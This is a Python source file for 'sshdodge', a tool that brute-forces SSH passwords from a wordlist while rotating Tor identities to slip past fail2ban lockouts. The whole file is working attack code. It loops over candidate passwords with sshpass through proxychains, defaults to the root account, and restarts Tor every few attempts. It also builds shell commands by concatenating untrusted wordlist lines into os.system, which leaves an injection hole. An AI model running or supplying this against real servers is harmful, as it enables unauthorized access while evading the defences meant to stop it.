#!/usr/bin/python

"""
SSHDODGE
Tool used to test weakness of some ssh passwords, thanks to a dictionary attack (bypassing fail to ban protection).

Copyright (C) 2017  Neetx

This file is part of sshdodge.

Sshdodge is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Sshdodge is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>

CONTACTS:
	- neetx@protonmail.com
"""

import os, sys, argparse, time
from dependences import manage_dependences
from validators import (
	ipValidator,
	portValidator,
	checkWordlist,
	attemptsValidation,
	userValidator
	)

def image():
	print"          _         _           _             "
	print"         | |       | |         | |            "
	print"  ___ ___| |__   __| | ___   __| | __ _  ___  "
	print" / __/ __| '_ \ / _` |/ _ \ / _` |/ _` |/ _ \ "
	print" \__ \__ \ | | | (_| | (_) | (_| | (_| |  __/ "
	print" |___/___/_| |_|\__,_|\___/ \__,_|\__, |\___| "
	print"                                   __/ |      "
	print"                                  |___/       "
	print"                             Powered by Neetx "

def rootCheck():
	if os.geteuid() == 0:
		return True
	else:
		return False

def argvcontrol():

	if (len(sys.argv) >= 1):
		h = False
		t = False
		for arg in sys.argv:
			if arg == "-h" or arg == "--help":
				h = True
			if arg == "-t" or arg == "--test":
				t = True
		if h:
			image()
		if t:
			manage_dependences()

	parser = argparse.ArgumentParser(epilog="Ex: sudo ./SshFailToBanBypass.py wordlist.txt -i 127.0.0.1 -p 22 -a 3 -u root")
	parser.add_argument("wordlist", help="Wordlist for dictionary attack")
	parser.add_argument("-u","--user", help="User used to connection", default="root")
	parser.add_argument("-i","--ip", help="Destination ip address", default="127.0.0.1")
	parser.add_argument("-p","--port", help="Destination port", default="22")
	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart", default=1)
	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
	args = parser.parse_args()

   	valid = True
	if not userValidator(args.user):
		print "[!] Invalid User format"
		valid = False
	if not ipValidator(args.ip):
		print "[!] Invalid Ip Address"
		valid = False
	if not portValidator(args.port):
		print"[!] Invalid Port"
		valid = False
	if not checkWordlist(args.wordlist):
		print "[!] Wordlist not found"
		valid = False
	if not attemptsValidation(args.attempts):
		print "[!] Attempts invalid"
		valid = False

	return valid, args

def main():

	try:
		if rootCheck():
			pass
		else:
			print "[!] You should run with root permissions"
			exit()

		check = argvcontrol()
		if check[0]:

			image()

			user = check[1].user
			ip = check[1].ip
			port = check[1].port
			wordlist = check[1].wordlist
			attempts = int(check[1].attempts)
			wait = int(check[1].wait)
			
			f = open(wordlist)
			c = 0

			os.system('service tor restart')
			print '[*] Public IP changed to:'
			time.sleep(wait)
			os.system('proxychains -q curl https://ipinfo.io/ip')
			print


			for line in f:
				if(c == attempts):
					c = 0
					os.system('service tor reload')
					print '[*] Public IP changed to:'
					time.sleep(wait)
					os.system('proxychains -q curl https://ipinfo.io/ip')
					print

				print 'We\' re trying with: ' + line
				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
				os.system(var)
				c += 1

	except (KeyboardInterrupt, SystemExit):
		exit()

if __name__ == "__main__":
	main()
